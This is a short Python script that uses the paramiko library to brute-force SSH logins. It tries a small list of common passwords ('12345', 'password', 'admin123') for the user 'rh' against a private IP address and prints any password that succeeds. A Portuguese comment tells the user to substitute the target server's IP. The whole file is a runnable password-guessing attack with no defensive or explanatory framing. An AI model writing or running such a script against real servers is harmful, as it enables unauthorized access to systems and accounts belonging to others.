import paramiko

def ssh_brute_force(ip, user, password_list):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for password in password_list:
        try:
            ssh.connect(ip, username=user, password=password)
            print(f"Password found: {password}")
            return True
        except paramiko.AuthenticationException:
            pass
    return False

ip = '192.168.22.3'  # Substitua pelo IP do servidor
user = 'rh'
password_list = ['12345', 'password', 'admin123']

ssh_brute_force(ip, user, password_list)
